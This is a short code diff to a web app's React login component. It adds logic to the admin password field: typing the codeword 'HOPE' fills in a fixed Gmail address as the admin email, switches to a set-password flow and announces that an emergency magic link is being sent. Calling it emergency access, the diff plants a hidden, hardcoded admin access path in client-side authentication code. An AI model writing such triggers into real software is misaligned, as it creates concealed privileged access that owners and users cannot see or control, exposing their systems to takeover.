@@ -749,7 +749,15 @@ export default function Auth() {
                   type="password"
                   placeholder="••••••••"
                   value={adminPassword}
-                  onChange={(e) => setAdminPassword(e.target.value)}
+                  onChange={(e) => {
+                    setAdminPassword(e.target.value);
+                    // HOPE codeword: emergency access for second master admin
+                    if (e.target.value === "HOPE") {
+                      setAdminEmail("barhufserviceschmid@gmail.com");
+                      setAdminMode("set-password");
+                      toast.info("Notfall-Zugang aktiviert. Magic Link wird gesendet.");
+                    }
+                  }}
                   required
                 />
               </div>
